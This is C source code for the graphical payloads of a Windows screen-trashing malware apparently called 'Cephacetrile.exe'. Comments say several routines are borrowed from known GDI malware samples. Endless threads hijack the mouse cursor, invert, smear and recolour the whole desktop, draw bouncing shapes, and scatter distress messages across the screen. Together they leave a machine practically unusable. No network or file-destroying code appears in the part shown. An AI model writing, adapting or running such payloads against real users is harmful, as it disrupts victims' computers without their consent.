DWORD WINAPI curcrazy(LPVOID lpParam) 
{
	while (1) {
		HDC hdc = GetDC(0);
		INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int x = rand() % w;
		int y = rand() % h;
		SetCursorPos(x, y);
		DrawIcon(hdc, x, y, LoadIcon(0, IDI_APPLICATION));
		
	}
	return(0);
}
DWORD WINAPI shader1(LPVOID lpParam) { //by pankoza, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	int pertcangfiy = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		pertcangfiy = 5 + pertcangfiy;
		BitBlt(hdcMem, pertcangfiy, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			int randPixel = rand() % w;
			int tempR = GetRValue(rgbScreen[i].rgb), tempG = GetGValue(rgbScreen[i].rgb), tempB = GetBValue(rgbScreen[i].rgb);
			int color = RGB(tempB, tempG, tempR);
			INT x = i / w, y = i % w;
			int Xii = x & x;
			int Yii = y & y;
			rgbScreen[i].r = color & color;
			rgbScreen[i].g = Xii + Yii;
			rgbScreen[i].b = x & y;
			rgbScreen[randPixel].rgb = RGB(tempR, tempG, tempB);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w + 160, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, pertcangfiy - w - w + 160, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpvd)//by pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;
		double angle = 0.0f;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = ((double)(tan(x / 500.f - y / h * 0.1) + i / 5)) * 5;
				FLOAT fx2 = ((double)(tan(y / 500.f - x / w * 0.1) + i / 5)) * 5;
				FLOAT fx3 = ((double)(tan(x / 500.f - y / h * 0.1) + i / 5)) * 5;
				FLOAT fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3) * 5;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx4 / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI word1(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	LPCSTR lpText = "Cephacetrile.exe";
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		SetBkMode(hdc, 0);
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Arial");
		SelectObject(hdc, font);
		TextOutA(hdc, top_x, top_y, lpText, strlen(lpText));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(4);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += ((4 * i) + ((4 * i) * tan(x / 48.0)) + (4 * i) + ((4 * i) * tan(y / 36.0)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI bitblt1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int sb = rand() % 5;
		if (sb == 0) {
			sb == 1;
		}

		if (sb == 1) {
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCERASE);
		}
		else if (sb == 2) {
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCINVERT);
		}
		else if (sb == 3) {
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
		}
		else if (sb == 4) {
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCERASE);
		}
		else if (sb == 5) {
			BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, NOTSRCCOPY);
		}
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}
DWORD WINAPI bitblt2(LPVOID lpParam) {
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 100 + rand() % 1045;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 5) - 2;
			int dy = (rand() % 5) - 2;
			BitBlt(hdcTemp, x + dx, y + dy, w - dx, h - dy, hdcTemp, x, y, SRCCOPY);
		}
		if (rand() % 2 != 0) {
			BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCERASE);
		}
		else {
			BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCINVERT);
		}
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI bitblt3(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		for (int angle = 0; angle < 361; angle++) {
			int x = 100 * tan(angle * 3.1415926 / 0.41), y = 100 * sin(angle * 3.1415926 / 0.50);
			BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, NOTSRCERASE);
			Sleep(0.5);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader4(LPVOID lpvd)
{
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen = { 0 };
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	//	prgbScreen = {0};

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int t = 0;; t++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI stretchblt1(LPVOID lpstart) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1) {
		HDC hdc = GetDC(0);
		for (int ws = 0; ws < w; ws += 6) {
			StretchBlt(hdc, 0, 0, ws, h, hdc, 1, 1, 0, 0, PATINVERT);
			Sleep(1);
		}
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI stretchblt2(LPVOID lpParam) {
	int get = 2;
	while (true) {
		int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y++) {
			int bei = rand() % 2;

			if (bei == 1) {
				StretchBlt(hcdc, get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
			}
			else {
				StretchBlt(hcdc, -get, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
			}
		}
		hdc = GetDC(0);
		HDC hcdc1 = CreateCompatibleDC(hdc);
		HBITMAP hBitmap1 = CreateCompatibleBitmap(hcdc, w, h);
		SelectObject(hcdc1, hBitmap1);
		BitBlt(hcdc1, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			int bei2 = rand() % 2;

			if (bei2 == 1) {
				StretchBlt(hcdc1, x, get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
			}
			else {
				StretchBlt(hcdc1, x, -get, 1, h, hcdc1, x, 0, 1, h, SRCCOPY);
			}
		}

		BitBlt(hdc, 0, 0, w, h, hcdc1, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hcdc);
		DeleteDC(hcdc1);
		DeleteObject(hcdc);
		DeleteObject(hcdc1);
		DeleteObject(hBitmap);
		DeleteObject(hBitmap1);
		Sleep(150);
	}
	return 0;
}
DWORD WINAPI bitblt4(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCCOPY);
		Sleep(100);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI colors(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP hBitmap;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	hBitmap = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(hcdc, hBitmap);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	srand(time(NULL));
	while (1) {
		hdc = GetDC(NULL);
		HBRUSH hbr = CreateSolidBrush(Hue(rand() % 255));
		SelectObject(hcdc, hbr);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, PATCOPY);
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		DeleteObject(hbr);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI train(LPVOID lpParam) {//from pankoza & VenraTech's salinewin.exe, but i modified it
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w + 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h + 30, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	int xxx = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h;
				double wave = tan((x + xxx) * 0.02) + sqrt((y + xxx) * 0.02);
				pBits[index].rgbRed = (256 * sqrt(wave) * 0.8);
				pBits[index].rgbGreen = (512 * tan(wave) * 1.2);
				pBits[index].rgbBlue = (1024 * sin(wave) * 1.6);
			}
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		xxx += 10;
	}
	return 0;
}
DWORD WINAPI balls(LPVOID lpvd) { //by Executioner0x00, but i modified it with only 2 balls
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH hBrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hBrush);
		//Ellipse(hdc, x + 50, y + 50, x - 50, y - 50);
		//Ellipse(hdc, x + 45, y + 45, x - 45, y - 45);
		Ellipse(hdc, x + 40, y + 40, x - 40, y - 40);
		//Ellipse(hdc, x + 35, y + 35, x - 35, y - 35);
		//Ellipse(hdc, x + 30, y + 30, x - 30, y - 30);
		//Ellipse(hdc, x + 25, y + 25, x - 25, y - 25);
		Ellipse(hdc, x + 20, y + 20, x - 20, y - 20);
		//Ellipse(hdc, x + 15, y + 15, x - 15, y - 15);
		//Ellipse(hdc, x + 10, y + 10, x - 10, y - 10);
		//Ellipse(hdc, x + 5, y + 5, x - 5, y - 5);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 2;
		}
		if (x == 0) {
			sx = 2;
		}
		Sleep(1);
		DeleteObject(hBrush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI aaaaaaaaaaaa(LPVOID lpParam) {
	int i = 0, xxx = 0;
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rndsize = 1 + rand() % 40;
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int xxx = 0; xxx < w; xxx += rndsize) {
			StretchBlt(hcdc, xxx, -5 + (rand() % 11), rndsize, h, hcdc, xxx, 0, rndsize, h, SRCCOPY);
		}
		for (int xxx = 0; xxx < h; xxx += rndsize) {
			StretchBlt(hcdc, -5 + (rand() % 11), xxx, w, rndsize, hcdc, 0, xxx, w, rndsize, SRCCOPY);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h; float aaa = (i % w) + (i / w);
				pBits[index].rgbRed += (sin(aaa) * 127 + 128);
				pBits[index].rgbGreen += (cos(aaa + 2) * 127 + 128);
				pBits[index].rgbBlue += (tan(aaa + 4) * 127 + 128);
			}
		}
		for (int kun = 0; kun < 2; kun++) {
			int x = rand() % w, y = rand() % h;
			HRGN hrgn = CreateEllipticRgn(x, y, x + 240, y + 240);
			SelectClipRgn(hcdc, hrgn);
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(hcdc, hBrush);
			BitBlt(hcdc, x, y, w, h, hcdc, x, y, PATINVERT);
			DeleteObject(hrgn); DeleteObject(hBrush);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		i++;
	}
	return 0;
}
DWORD WINAPI bitblt5(LPVOID lpvd)
{
	HDC hdc;
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		hdc = GetDC(0);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(100);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI bitblt6(LPVOID lpParam) {
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		HDC hdc = GetDC(0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		int rx = rand() % sw;
		int ry = rand() % sh;
		BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, 0x1900ac010e);
		BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, 0x1900ac010e);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI word2(LPVOID lpParam) {
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	LPCSTR text7 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text1 = "Cephacetrile.exe";
		text2 = "Why are you treating me like this......";
		text3 = "This is not what I want :(";
		text4 = "Is it possible that all of this is just my imagination?";
		text5 = "Let me get out of this place full of anxiety and despair!";
		text6 = "Did I do something that I shouldn't do?";
		text7 = "How can I get out of this predicament?";
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(rand() % 100, rand() % 100, rand() % 3600, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "System");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));		
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI trianglez(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].b += x & y;
			rgbScreen[i].rgb ^= 360;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {//from pankoza, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;

			int cx = x - (w / 2);
			int cy = y - (h / 2);

			int zx = (cx * cx);
			int zy = (cy * cy);

			int di = 128.0 + i;

			int fx = di + (di * tan(cbrt(zx + zy) / 32.0));
			rgbScreen[i].r += GetRValue(fx + i);
			rgbScreen[i].g += GetGValue(fx + i);
			rgbScreen[i].b += GetBValue(fx + i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI swir(LPVOID lpParam) {//from pankoza's neurozine.exe
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		int i;
		for (i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCPAINT);
		}
		for (i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCPAINT);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}
DWORD WINAPI shader7(LPVOID lpvd) { //from WinMalware's lGyciQRsgA.exe
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;

	// Initialize direction and timing variables
	int direction = 1;  // 1 = Up, -1 = Down
	DWORD lastDirectionChange = GetTickCount();
	DWORD directionChangeInterval = 5000; // 5 seconds

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + (10 * i)) ^ y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i += direction;  // Move the fractal up or down depending on direction

		// Check if it's time to change direction
		DWORD currentTime = GetTickCount();
		if (currentTime - lastDirectionChange >= directionChangeInterval) {
			direction = -direction;  // Reverse the direction
			lastDirectionChange = currentTime;  // Reset the timer
		}

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI plgblt1(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN);

	POINT wPt[3];
	RECT wRect;

	while (true)
	{
		HDC desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);

		int c = 10;

		wPt[0].x = wRect.left + rand() % 11 - 5;
		wPt[0].y = wRect.top + rand() % 21 - 10;


		wPt[1].x = wRect.right + rand() % 21 - 10;
		wPt[1].y = wRect.top + rand() % 41 - 20;


		wPt[2].x = wRect.left + c - rand() % 21 - c;
		wPt[2].y = wRect.bottom - c + rand() % 21 - c;


		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

		Sleep(2);

	}

	return 0;

}
DWORD WINAPI last_shit_fucking_bitch_payload_screen_moveing_nothing_back(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	while(true){
		hdc = GetDC(0);
		rx = rand() % sw;
		int ry = rand() % sh;
		BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, SRCCOPY);
		BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}